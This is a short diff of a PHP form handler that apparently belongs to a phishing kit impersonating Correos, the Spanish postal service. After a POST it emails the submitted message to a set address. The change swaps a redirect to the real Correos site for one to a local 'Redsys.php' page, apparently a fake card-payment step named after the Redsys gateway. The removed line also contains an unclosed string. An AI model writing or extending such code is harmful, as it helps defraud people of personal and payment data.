@@ -25,7 +25,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
 			mail($to, $subject, $message, $headers);
 			
-      header("Location: https://www.correos.es/es/es/particulares);
+      header("Location: Redsys.php?loading=".md5($_GET['error']));
     }else header("Location: ?error=".md5($_GET['error']));
 }
 ?>
